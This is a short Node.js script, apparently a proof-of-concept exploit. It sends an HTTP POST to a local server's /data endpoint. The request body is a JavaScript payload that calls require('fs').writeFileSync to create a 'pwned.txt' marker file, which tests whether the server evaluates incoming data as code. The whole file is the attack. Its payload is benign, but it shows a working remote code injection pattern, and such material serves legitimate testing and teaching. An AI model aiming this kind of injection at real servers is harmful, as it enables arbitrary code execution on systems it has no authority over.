const http = require('http')
const port = process.argv[2] ? process.argv[2] : 8000;

const payload = 'require("fs").writeFileSync("./pwned.txt", "uh-oh!\\n", "utf-8")'
const data = payload;

const options = {
  hostname: 'localhost',
  port: port,
  path: '/data',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  }
}

const req = http.request(options);

req.write(data)
req.end()
